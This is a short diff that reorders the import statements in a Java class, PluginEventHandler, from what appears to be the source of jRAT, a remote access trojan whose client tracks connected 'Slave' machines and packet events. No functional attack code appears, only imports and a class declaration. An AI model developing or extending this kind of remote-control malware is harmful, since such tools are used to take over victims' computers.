@@ -1,11 +1,11 @@
 package su.jrat.client.extensions;
 
-import su.jrat.client.Slave;
 import jrat.api.Packet;
 import jrat.api.events.OnConnectEvent;
 import jrat.api.events.OnDisconnectEvent;
 import jrat.api.events.OnPacketEvent;
 import jrat.api.events.OnSendPacketEvent;
+import su.jrat.client.Slave;
 
 public class PluginEventHandler {
 
